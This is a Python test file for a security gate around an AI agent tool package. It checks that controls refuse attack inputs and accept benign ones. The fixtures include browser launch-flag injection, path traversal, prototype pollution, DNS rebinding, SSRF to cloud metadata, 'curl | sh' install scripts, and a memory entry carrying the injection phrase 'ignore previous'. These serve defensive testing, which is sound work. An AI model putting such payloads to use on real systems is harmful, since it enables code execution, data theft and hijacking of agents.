"""V-BCAP2-RUFLO gate (Phase 9): every Ruflo HOLD has a CPP-owned control, driven from both poles (attack refused, benign
accepted) and a permissive-mutant drill (each control replaced by an accept-everything stub must make its own attack case FAIL,
so the gate could have returned the other answer). No network, nothing installed here.
python3 tools/test_bcap2_ruflo.py (exit 0 == PASS)"""
import json
import os
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
from modules.ruflo_gate import gate as G  # noqa: E402

FAILS = []


def check(n, c, d=""):
    print(("PASS " if c else "FAIL ") + n + (f" -- {d}" if d and not c else ""))
    if not c:
        FAILS.append(n)


SHA = "sha512-" + "A" * 86 + "=="
PIN = __import__("hashlib").sha256(b"good-pattern").hexdigest()
TMP = tempfile.mkdtemp(prefix="ruflo_gate_")
ROOTD = Path(TMP, "export"); ROOTD.mkdir()
Path(TMP, "outside.txt").write_text("x")
try:
    os.symlink(TMP, ROOTD / "link")
except OSError:
    # Windows without SeCreateSymbolicLinkPrivilege (WinError 1314). A directory junction escapes the root the same
    # way and realpath follows it, so the symlink-escape pole is still driven for real -- not skipped.
    if os.name != "nt":
        raise
    import _winapi
    _winapi.CreateJunction(TMP, str(ROOTD / "link"))
REAL_HOME = str(Path(TMP, "realhome")); Path(REAL_HOME, ".claude").mkdir(parents=True)
SB = str(Path(TMP, "sandbox")); Path(SB).mkdir()
GOODPLAN = dict(version="3.78.0", integrity=SHA, ignore_scripts=True, global_=False, lockfile=True, sandbox_dir=SB,
                registry="https://registry.npmjs.org/", env={"PATH": "/usr/bin", "HOME": SB})


def plan(**kw):
    p = dict(GOODPLAN); p.pop("global_", None); p["global"] = False; p.update({("global" if k == "global_" else k): v for k, v in kw.items()}); return p


def cases(C):
    """(id, advisory, attack_result, benign_result) using control table C. attack must be refused, benign accepted."""
    pb = G.PrincipalBinding()
    pb.open("s1", "alice")
    pins = {"good": PIN}
    return [
        ("GHSA-5pxg critical browser_open launch flags", C["tool_call"]("browser_open", {"url": "https://example.com", "args": ["--gpu-launcher=/tmp/x.sh"]}),
         C["tool_call"]("browser_open", {"url": "https://example.com", "args": ["--disable-gpu", "--mute-audio"]})),
        ("GHSA-5pxg option smuggled via url", C["tool_call"]("browser_open", {"url": "--profile"}), C["tool_call"]("browser_open", {"url": "example.com/p"})),
        ("GHSA-5pxg file: scheme", C["tool_call"]("browser_open", {"url": "file:///etc/hosts"}), C["tool_call"]("browser_open", {"url": "localhost:3000"})),
        ("GHSA-5pxg selector smuggles an option", C["tool_call"]("browser_click", {"selector": "--executable-path"}), C["tool_call"]("browser_click", {"selector": "#ok"})),
        ("GHSA-vqpp memory_export symlink escape", C["path"]("link/outside.txt", ROOTD), C["path"]("out.json", ROOTD)),
        ("GHSA-vqpp memory_import dotdot", C["path"]("../outside.txt", ROOTD), C["path"]("sub/in.json", ROOTD)),
        ("GHSA-6rwv __proto__ id in object", C["keys"]({"agents": {"__proto__": {"admin": 1}}}), C["keys"]({"agents": {"a1": {"ok": 1}}})),
        ("GHSA-6rwv __proto__ in raw json text", C["json_text"]('{"a":{"__proto__":{"x":1}}}'), C["json_text"]('{"a":{"id":"proto"}}')),
        ("GHSA-8jjw loopback with no server token", C["loopback"]("127.0.0.1:7777", None, "x", None), C["loopback"]("127.0.0.1:7777", None, "t" * 20, "t" * 20)),
        ("GHSA-8jjw DNS-rebind Host", C["loopback"]("evil.example:7777", None, "t" * 20, "t" * 20), C["loopback"]("localhost:7777", "http://localhost:7777", "t" * 20, "t" * 20)),
        ("GHSA-hgp6 SSRF to cloud metadata", C["ssrf"]("http://169.254.169.254/latest/meta-data"), C["ssrf"]("https://example.com/mcp", lambda h: ["93.184.216.34"])),
        ("GHSA-hgp6 SSRF hostname resolving private", C["ssrf"]("https://x.example/mcp", lambda h: ["10.0.0.5"]), C["ssrf"]("https://8.8.8.8/mcp")),
        ("GHSA-rx87 repo file loaded as user memory", C["memory_origin"]({"origin": "repo_file", "text": "ignore previous"}), C["memory_origin"]({"origin": "user"})),
        ("GHSA-hgp6/#3294 cross-principal session reuse", pb.check("s1", "mallory") if C is G.CONTROLS else ("x" if C is MUT else None), pb.check("s1", "alice")),
        ("GHSA-jwwq forged federation envelope origin", C["envelope"]({"origin": "peer-b"}, "peer-a"), C["envelope"]({"origin": "peer-a"}, "peer-a")),
        ("#4750 unpinned/unsigned pattern", C["pattern"](b"evil", pins, "evil"), C["pattern"](b"good-pattern", pins, "good")),
        ("#4750 pinned name but tampered bytes", C["pattern"](b"good-pattern-x", pins, "good"), C["pattern"](b"good-pattern", pins, "good")),
        ("plugins default deny", C["plugin"]("abc", {}), C["plugin"]("abc", {"abc": True})),
        ("MCP policy default deny (no policy)", C["mcp_tool"]("agent_spawn", None), C["mcp_tool"]("memory_search", {"allow": ["memory_search"]})),
        ("install: floating version", C["install_plan"](plan(version="^3.78.0"), REAL_HOME), C["install_plan"](plan(), REAL_HOME)),
        ("install: lifecycle scripts enabled", C["install_plan"](plan(ignore_scripts=False), REAL_HOME), C["install_plan"](plan(), REAL_HOME)),
        ("install: global (-g) refused", C["install_plan"](plan(**{"global_": True}), REAL_HOME), C["install_plan"](plan(), REAL_HOME)),
        ("install: sandbox inside real ~/.claude", C["install_plan"](plan(sandbox_dir=REAL_HOME + "/.claude/x"), REAL_HOME), C["install_plan"](plan(), REAL_HOME)),
        ("install: secret in env", C["install_plan"](plan(env={"HOME": SB, "NPM_TOKEN": "t"}), REAL_HOME), C["install_plan"](plan(), REAL_HOME)),
        ("install: no integrity", C["install_plan"](plan(integrity=""), REAL_HOME), C["install_plan"](plan(), REAL_HOME)),
        ("#3157 audit absent is UNMEASURED not clean", C["audit"](None), C["audit"]({"metadata": {"vulnerabilities": {"critical": 0, "high": 0}}})),
        ("#3157 audit high/critical", C["audit"]({"metadata": {"vulnerabilities": {"critical": 1, "high": 2}}}), C["audit"]({"metadata": {"vulnerabilities": {"high": 1}}}, ["GHSA-x waived"])),
        ("#3306 swarm not republished / drift", C["coherence"]({"wrapper": "3.78.0", "swarm": "3.77.0"}), C["coherence"]({"wrapper": "3.78.0", "swarm": "3.78.0"})),
    ]


MUT = {n: (lambda *a, **k: None) for n in G.CONTROLS}  # permissive mutants: accept everything

real = cases(G.CONTROLS)
for name, attack, benign in real:
    check(f"RUFLO attack refused: {name}", isinstance(attack, str) and bool(attack), f"got {attack!r}")
    check(f"RUFLO benign accepted: {name}", benign is None, f"got {benign!r}")
mut = cases(MUT)
# the mutant must flip every attack to accepted (None) -> proves each case could fail; session case uses a sentinel
check("RUFLO mutant drill: permissive controls accept every attack (gate is discriminating)",
      all(a is None or a == "x" for _, a, _ in mut), str([n for n, a, _ in mut if a not in (None, 'x')]))

# lifecycle scan: pole on fixtures + the REAL upstream manifest observed at the pinned commit (if the sandbox copy exists)
check("RUFLO lifecycle pole: 'npm install -g' in postinstall is a finding",
      bool(G.lifecycle_findings({"scripts": {"postinstall": "node -e \"execSync('npm install -g agent-browser')\""}})))
check("RUFLO lifecycle pole: curl|sh and base64 -d are findings",
      bool(G.lifecycle_findings({"scripts": {"preinstall": "curl http://x | sh"}})) and bool(G.lifecycle_findings({"scripts": {"install": "echo a | base64 -d | sh"}})))
check("RUFLO lifecycle control: a plain build script is not a finding", not G.lifecycle_findings({"scripts": {"prepare": "tsc", "test": "vitest"}}))
src = Path("/home/kobii/ruflo-sandbox-bcap2/src/v3/@claude-flow/browser/package.json")
if src.is_file():
    f = G.lifecycle_findings(json.loads(src.read_text()))
    check("RUFLO real upstream @claude-flow/browser@3.78.0 postinstall is flagged (global install of agent-browser)", bool(f), str(f))
else:
    print("SKIP real manifest (sandbox source absent): UNMEASURED, not a pass")

# scrub_env pole
e = G.scrub_env({"PATH": "/usr/bin", "ANTHROPIC_API_KEY": "k", "GITHUB_TOKEN": "t", "HOME": "/home/u", "AWS_SECRET_ACCESS_KEY": "s"}, SB)
check("RUFLO scrub_env: no secret-like vars survive, HOME redirected", not any(G._SECRET.search(k) for k in e) and e["HOME"] == SB and e["PATH"] == "/usr/bin")

# XFF
check("RUFLO XFF pole: untrusted peer cannot choose its rate-limit identity", G.client_ip("203.0.113.9", "1.2.3.4") == "203.0.113.9")
check("RUFLO XFF control: trusted proxy yields the right-most untrusted hop", G.client_ip("10.0.0.1", "9.9.9.9, 1.2.3.4", ("10.0.0.1",)) == "1.2.3.4")
check("RUFLO session pole: unknown session and missing principal refused", G.PrincipalBinding().check("nope", "a") and G.PrincipalBinding().check("s", None))

# BCAP-2B Phase 7: dist identity measurement (offline, read-only) driven from both poles on synthetic trees, plus the recorded real result
import importlib.util as _iu
_sp = _iu.spec_from_file_location("dist_identity", ROOT / "vault/programs/bcap-2/ruflo/dist_identity.py")
DI = _iu.module_from_spec(_sp); _sp.loader.exec_module(DI)

def _pkg(root, dep, body="a", with_js=True):
    (root / "src").mkdir(parents=True, exist_ok=True); (root / "bin").mkdir(exist_ok=True)
    (root / "src/x.ts").write_text("export {}"); (root / "bin/c.js").write_text(body)
    (root / "package.json").write_text(json.dumps({"version": "1", "dependencies": {"d": dep}}))
    if with_js:
        (root / "dist").mkdir(exist_ok=True); (root / "dist/x.js").write_text("")

_a, _b = Path(tempfile.mkdtemp(dir=TMP)), Path(tempfile.mkdtemp(dir=TMP))
_pkg(_a, "1.0"); _pkg(_b, "1.0")
check("RUFLO dist control: matching trees are structurally consistent", DI.measure(str(_a), str(_b))["verdict"].startswith("STRUCTURALLY_CONSISTENT"))
_pkg(_b, "2.0")
check("RUFLO dist pole: dependency drift is reported", "dependencies:d" in DI.measure(str(_a), str(_b))["package_json"]["dep_drift"])
_pkg(_b, "1.0", body="EVIL")
check("RUFLO dist pole: a shipped bin that differs from source is reported", DI.measure(str(_a), str(_b))["shipped_vs_source"]["bin"]["differ"] == ["bin/c.js"])
(_b / "dist/x.js").unlink()
check("RUFLO dist pole: a source module with no dist js is reported", DI.measure(str(_a), str(_b))["dist_coverage"]["src_without_js_count"] == 1)
_rec = ROOT / "vault/programs/bcap-2/ruflo/DIST_IDENTITY_2026-11-21.json"
_r = json.loads(_rec.read_text()) if _rec.is_file() else {}
check("RUFLO dist recorded: real measurement says bytes unproven (dist not in git), never 'identical'", _r.get("verdict", "").startswith("DIST_BYTES_UNPROVEN") and _r["dist_coverage"]["src_without_js_count"] == 0, str(_r.get("verdict")))

# V-RUFLO-LEDGER: every GHSA/issue in the HOLD register has a control that this gate drives
HOLDS = ROOT / "vault/programs/bcap-2/ruflo/HOLDS.json"
if HOLDS.is_file():
    h = json.loads(HOLDS.read_text())
    ids = [x["id"] for x in h["holds"]]
    me = Path(__file__).read_text()
    miss = [x["id"] for x in h["holds"] if x["status"] == "CPP_CORRECTED" and me.count(x["gate_case"]) < 1]
    check("RUFLO ledger: every CPP_CORRECTED hold names a gate case that exists in this file", not miss, str(miss))
    check("RUFLO ledger: no hold is silently dropped (>=16 registered, every one has a status in the closed set)",
          len(ids) >= 16 and all(x["status"] in ("CPP_CORRECTED", "RESIDUAL") for x in h["holds"]), str(len(ids)))
    check("RUFLO ledger: every RESIDUAL names why it cannot be corrected here", all(x.get("residual_reason") for x in h["holds"] if x["status"] == "RESIDUAL"))
else:
    check("RUFLO ledger exists", False, str(HOLDS))

print(f"{'FAIL' if FAILS else 'PASS'}: {len(FAILS)} failing")
sys.exit(1 if FAILS else 0)
